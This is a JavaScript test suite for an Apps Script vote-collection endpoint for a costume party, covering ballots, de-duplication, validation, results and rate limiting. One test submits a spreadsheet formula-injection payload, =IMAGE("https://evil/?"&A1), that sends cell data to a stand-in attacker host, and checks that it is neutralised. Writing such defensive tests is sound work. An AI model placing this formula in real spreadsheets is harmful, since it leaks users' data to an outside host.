import { readFileSync } from 'node:fs'

const SRC = readFileSync(new URL('../Code.gs', import.meta.url), 'utf8')

/** Minimal fakes for the Apps Script services the endpoint touches. */
function makeEnv({ open = true, hostKey = 'hostkey123', merges = [] } = {}) {
  const tabs = {
    Votes: [['Timestamp', 'Device', 'Voter', 'Category', 'Nominee', 'Costume']],
    Settings: [
      ['Setting', 'Value'],
      ['Voting open', open],
      ['Host key', hostKey],
    ],
    Merges: [['Alias', 'Canonical'], ...merges],
    Log: [['Timestamp', 'Device', 'Voter', 'Category', 'Result', 'Detail']],
  }
  const makeSheet = (name) => ({
    getLastRow: () => tabs[name].length,
    getDataRange: () => ({ getValues: () => tabs[name].map((r) => [...r]) }),
    appendRow: (row) => tabs[name].push(row),
    setFrozenRows: () => {},
    clear: () => {
      tabs[name] = []
    },
    getRange: (row, col, numRows = 1, numCols = 1) => ({
      getValues: () =>
        Array.from({ length: numRows }, (_, r) =>
          Array.from({ length: numCols }, (_, c) => {
            const v = (tabs[name][row - 1 + r] || [])[col - 1 + c]
            return v === undefined ? '' : v
          }),
        ),
      getValue: () => {
        const v = (tabs[name][row - 1] || [])[col - 1]
        return v === undefined ? '' : v
      },
      setValues: (vals) => {
        vals.forEach((rowVals, r) => {
          tabs[name][row - 1 + r] = tabs[name][row - 1 + r] || []
          rowVals.forEach((v, c) => {
            tabs[name][row - 1 + r][col - 1 + c] = v
          })
        })
      },
      setValue: (v) => {
        tabs[name][row - 1] = tabs[name][row - 1] || []
        tabs[name][row - 1][col - 1] = v
      },
      insertCheckboxes() {
        return this
      },
    }),
  })
  const cache = new Map()
  const globals = {
    SpreadsheetApp: {
      getActive: () => ({
        getSheetByName: (n) => (tabs[n] ? makeSheet(n) : null),
        insertSheet: (n) => {
          tabs[n] = []
          return makeSheet(n)
        },
      }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cache.has(k) ? cache.get(k) : null),
        put: (k, v) => cache.set(k, v),
        remove: (k) => cache.delete(k),
      }),
    },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (t) => ({ setMimeType: () => ({ _text: t }) }),
    },
    Utilities: { getUuid: () => '0123456789abcdef0123456789abcdef' },
  }
  const names = Object.keys(globals)
  const api = new Function(
    ...names,
    SRC +
      '\n; return { post: function(body){ return doPost({ postData: { contents: body } }) },' +
      ' get: function(p){ return doGet({ parameter: p }) }, normalizeName: normalizeName,' +
      ' refreshTally: refreshTally };',
  )(...names.map((n) => globals[n]))
  return {
    post: (obj) => JSON.parse(api.post(JSON.stringify(obj))._text),
    get: (params) => JSON.parse(api.get(params)._text),
    normalizeName: api.normalizeName,
    refreshTally: api.refreshTally,
    tabs,
    cache,
  }
}

const PHONE_A = 'a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d'
const PHONE_B = 'b1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d'
const PHONE_C = 'c1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d'

const ballot = (device, voter, votes) => ({ device, voter, votes, website: '' })
const VALID = ballot(PHONE_A, 'Vivien Leigh', [
  { category: 'best-dressed', nominee: 'Bette Davis', costume: 'Baby Jane' },
  { category: 'couples', nominee: 'Ben & Andi', costume: 'Bonnie and Clyde' },
  { category: 'scariest', nominee: 'Boris Karloff', costume: 'The Mummy' },
])

let pass = 0
let total = 0
const check = (label, cond, extra = '') => {
  total++
  if (cond) pass++
  console.log(`  ${cond ? 'PASS' : 'FAIL'}  ${label}${extra ? '  ' + extra : ''}`)
}
const voteRows = (env) => env.tabs.Votes.slice(1).filter((r) => r[3])

// --- happy path -------------------------------------------------------------
{
  const env = makeEnv()
  const res = env.post(VALID)
  check('valid ballot accepted', res.ok === true)
  check('one row per category', voteRows(env).length === 3)
  check('logged as accepted', env.tabs.Log.filter((r) => r[4] === 'accepted').length === 3)
}

// --- skipping categories ----------------------------------------------------
{
  const env = makeEnv()
  const res = env.post(ballot(PHONE_A, 'Vivien', [{ category: 'scariest', nominee: 'Boris', costume: '' }]))
  check('single-category ballot accepted', res.ok === true)
  check('  costume may be blank', voteRows(env)[0][5] === '')
  check('empty ballot rejected', env.post(ballot(PHONE_A, 'Vivien', [])).ok === false)
}

// --- one ballot per phone ---------------------------------------------------
{
  const env = makeEnv()
  env.post(VALID)
  env.post(ballot(PHONE_A, 'Vivien Leigh', [{ category: 'scariest', nominee: 'Bela Lugosi', costume: 'Dracula' }]))
  check('same phone re-voting replaces, not adds', voteRows(env).length === 3)
  check('  with the new choice', voteRows(env).find((r) => r[3] === 'scariest')[4] === 'Bela Lugosi')
  check('  other categories kept', voteRows(env).find((r) => r[3] === 'best-dressed')[4] === 'Bette Davis')
  check('  logged as updated', env.tabs.Log.some((r) => r[4] === 'updated'))

  env.post(ballot(PHONE_A, 'Someone Else', [{ category: 'scariest', nominee: 'Lon Chaney', costume: '' }]))
  check('same phone, new name still replaces', voteRows(env).filter((r) => r[3] === 'scariest').length === 1)

  env.post(ballot(PHONE_B, 'Someone Else', [{ category: 'scariest', nominee: 'Vincent Price', costume: '' }]))
  check('same name from a second phone replaces', voteRows(env).filter((r) => r[3] === 'scariest').length === 1)
  check('  normalized: case and spacing ignored', (() => {
    env.post(ballot(PHONE_C, '  someone   ELSE ', [{ category: 'scariest', nominee: 'Peter Lorre', costume: '' }]))
    return voteRows(env).filter((r) => r[3] === 'scariest').length === 1
  })())

  env.post(ballot(PHONE_B, 'Grace Kelly', [{ category: 'scariest', nominee: 'Boris', costume: '' }]))
  check('different phone and name adds a vote', voteRows(env).filter((r) => r[3] === 'scariest').length === 2)
}

// --- a ballot matching two old rows collapses to one --------------------------
{
  const env = makeEnv()
  env.post(ballot(PHONE_A, 'Grace', [{ category: 'scariest', nominee: 'X', costume: '' }]))
  env.post(ballot(PHONE_B, 'Rita', [{ category: 'scariest', nominee: 'Y', costume: '' }]))
  // Phone A, but now under Rita's name: matches both rows.
  env.post(ballot(PHONE_A, 'Rita', [{ category: 'scariest', nominee: 'Z', costume: '' }]))
  check('double match leaves one live row', voteRows(env).length === 1)
  check('  carrying the newest vote', voteRows(env)[0][4] === 'Z')
}

// --- withdrawing a category --------------------------------------------------
{
  const env = makeEnv()
  env.post(VALID)
  const res = env.post({ ...ballot(PHONE_A, 'Vivien Leigh', []), withdraw: ['scariest'] })
  check('withdraw-only ballot accepted', res.ok === true)
  check('  removes that vote', !voteRows(env).some((r) => r[3] === 'scariest'))
  check('  leaves the others', voteRows(env).length === 2)
  check('  logged as withdrawn', env.tabs.Log.some((r) => r[4] === 'withdrawn'))
  env.post({ ...ballot(PHONE_B, 'Grace', [{ category: 'couples', nominee: 'X & Y', costume: '' }]) })
  env.post({ ...ballot(PHONE_A, 'Vivien Leigh', []), withdraw: ['couples'] })
  check('  never touches another guest', voteRows(env).filter((r) => r[3] === 'couples').length === 1)
  check(
    'vote and withdraw of one category rejected',
    env.post({ ...ballot(PHONE_A, 'V', [{ category: 'couples', nominee: 'A', costume: '' }]), withdraw: ['couples'] })
      .ok === false,
  )
  check('unknown withdrawal rejected', env.post({ ...ballot(PHONE_A, 'V', []), withdraw: ['funniest'] }).ok === false)
}

// --- voting toggle ----------------------------------------------------------
{
  const env = makeEnv({ open: false })
  const res = env.post(VALID)
  check('closed box rejects ballots', res.ok === false && res.closed === true)
  check('  and writes nothing', voteRows(env).length === 0)
  check('status reports closed', env.get({ action: 'status' }).open === false)
  env.tabs.Settings[1][1] = 'TRUE'
  check('string TRUE reopens', env.post(VALID).ok === true)
}

// --- honeypot ---------------------------------------------------------------
{
  const env = makeEnv()
  const res = env.post({ ...VALID, website: 'http://spam.example' })
  check('honeypot returns ok (no signal to the bot)', res.ok === true)
  check('  but writes no vote', voteRows(env).length === 0)
  check('  and is logged as honeypot', env.tabs.Log.some((r) => r[4] === 'honeypot'))
}

// --- validation -------------------------------------------------------------
{
  const env = makeEnv()
  const one = (v) => [{ category: 'scariest', nominee: 'Boris', costume: '', ...v }]
  check('missing device rejected', env.post(ballot('', 'V', one())).ok === false)
  check('short device rejected', env.post(ballot('abc', 'V', one())).ok === false)
  check('formula-leading device rejected', env.post(ballot('-' + PHONE_A.slice(1), 'V', one())).ok === false)
  check('empty voter rejected', env.post(ballot(PHONE_A, '  ', one())).ok === false)
  check('81-char voter rejected', env.post(ballot(PHONE_A, 'x'.repeat(81), one())).ok === false)
  check('unknown category rejected', env.post(ballot(PHONE_A, 'V', one({ category: 'funniest' }))).ok === false)
  check(
    'repeated category rejected',
    env.post(ballot(PHONE_A, 'V', [...one(), ...one()])).ok === false,
  )
  check('empty nominee rejected', env.post(ballot(PHONE_A, 'V', one({ nominee: ' ' }))).ok === false)
  check('121-char costume rejected', env.post(ballot(PHONE_A, 'V', one({ costume: 'x'.repeat(121) }))).ok === false)
  check('votes not an array rejected', env.post({ ...VALID, votes: 'all of them' }).ok === false)
  check('nothing written by any of that', voteRows(env).length === 0)
}

// --- formula injection reaches the cell safely ------------------------------
{
  const env = makeEnv()
  env.post(ballot(PHONE_A, '=IMAGE("https://evil/?"&A1)', [
    { category: 'scariest', nominee: '+cmd', costume: '@evil' },
  ]))
  const row = voteRows(env)[0]
  check('voter formula neutralised', row[2].startsWith("'="))
  check('nominee formula neutralised', row[4].startsWith("'+"))
  check('costume formula neutralised', row[5].startsWith("'@"))
  const nominees = env.get({ action: 'status' }).nominees
  check('apostrophe stripped on the way back out', nominees[0].name === '+cmd')
}

// --- normalization ----------------------------------------------------------
{
  const { normalizeName: n } = makeEnv()
  check('case and spacing', n('  Sarah   WILLIAMS ') === 'sarah williams')
  check('punctuation and accents', n("Zoë O’Neil-Smith") === 'zoe oneilsmith')
  check('couples ignore order', n('Andi & Ben') === n('ben and andi'))
  check('  and joiner style', n('Ben + Andi') === n('Ben/Andi'))
}

// --- results ----------------------------------------------------------------
{
  const env = makeEnv({ merges: [['the vampire', 'Sarah Williams']] })
  const vote = (device, voter, nominee, costume = '') =>
    env.post(ballot(device, voter, [{ category: 'best-dressed', nominee, costume }]))
  const id = (i) => `phone-${String(i).padStart(12, '0')}`
  vote(id(1), 'g1', 'Sarah Williams', 'Vampire')
  vote(id(2), 'g2', 'sarah williams', 'Vampire queen')
  vote(id(3), 'g3', 'The Vampire', 'Vampire')
  vote(id(4), 'g4', 'Tom', 'Zombie')
  vote(id(5), 'g5', 'Tom', 'Zombie')
  vote(id(6), 'g6', 'Tom', 'Zombie')
  vote(id(7), 'g7', 'Ann')
  env.post(ballot(id(8), 'g8', [{ category: 'couples', nominee: 'Andi & Ben', costume: '' }]))
  env.post(ballot(id(9), 'g9', [{ category: 'couples', nominee: 'Ben and Andi', costume: '' }]))

  check('results need the host key', env.get({ action: 'results' }).ok === false)
  check('  and reject a wrong one', env.get({ action: 'results', key: 'nope' }).ok === false)
  const r = env.get({ action: 'results', key: 'hostkey123' })
  check('results with key', r.ok === true)
  const bd = r.categories.find((c) => c.id === 'best-dressed')
  const sarah = bd.entries.find((e) => e.name === 'Sarah Williams')
  check('merge folds an alias into the canonical name', sarah && sarah.votes === 3)
  const tom = bd.entries.find((e) => e.name === 'Tom')
  check('ties share first place (co-winners)', sarah.rank === 1 && tom.rank === 1)
  check('next place skips to 3', bd.entries.find((e) => e.name === 'Ann').rank === 3)
  check('most common costume wins', sarah.costume === 'Vampire')
  const couples = r.categories.find((c) => c.id === 'couples')
  check('couple spellings fold together', couples.entries.length === 1 && couples.entries[0].votes === 2)
  check('ballot count is distinct voters', r.totalBallots === 9)
  check('empty category still listed', r.categories.find((c) => c.id === 'scariest').entries.length === 0)

  const status = env.get({ action: 'status' })
  check('autocomplete never leaks counts', status.nominees.every((n) => !('votes' in n)))
  check('autocomplete tags couples', status.nominees.some((n) => n.kind === 'couple'))

  env.refreshTally()
  check('tally tab written', env.tabs.Tally.some((row) => row[0] === 'Best Dressed'))
}

// --- autocomplete cache ------------------------------------------------------
{
  const env = makeEnv()
  check('empty box has no nominees', env.get({ action: 'status' }).nominees.length === 0)
  env.post(VALID)
  check('a new ballot busts the cache', env.get({ action: 'status' }).nominees.length === 3)
}

// --- rate limit -------------------------------------------------------------
{
  const env = makeEnv()
  let lastOk = true
  for (let i = 0; i < 151; i++) {
    lastOk = env.post(ballot(PHONE_A, 'V', [{ category: 'scariest', nominee: 'B' + i, costume: '' }])).ok
  }
  check('151st ballot in the window is refused', lastOk === false)
  check('  and the flood is logged once', env.tabs.Log.filter((r) => r[4] === 'rate-limited').length === 1)
}

console.log(`\n${pass}/${total} passed`)
if (pass !== total) process.exit(1)
